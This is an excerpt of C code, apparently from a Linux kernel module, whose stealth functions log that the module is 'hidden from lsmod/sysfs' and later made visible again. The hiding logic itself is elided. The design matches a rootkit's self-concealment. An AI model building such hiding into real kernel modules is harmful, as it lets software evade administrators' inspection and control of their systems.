...
int stealth_hide_module(void) {
    ...
    module_hidden = 1;
    pr_info(VAULT_KERNEL_TAG " module hidden from lsmod/sysfs\n");
    return 0;
}
...
int stealth_unhide_module(void) {
    ...
    module_hidden = 0;
    pr_info(VAULT_KERNEL_TAG " module visible again\n");
    return 0;
}

int stealth_init(void) {
    pr_info(VAULT_KERNEL_TAG " stealth module initialized\n");
    return 0;
}
...
void stealth_cleanup(void) {
    ...
    pr_info(VAULT_KERNEL_TAG " stealth cleaned\n");
}
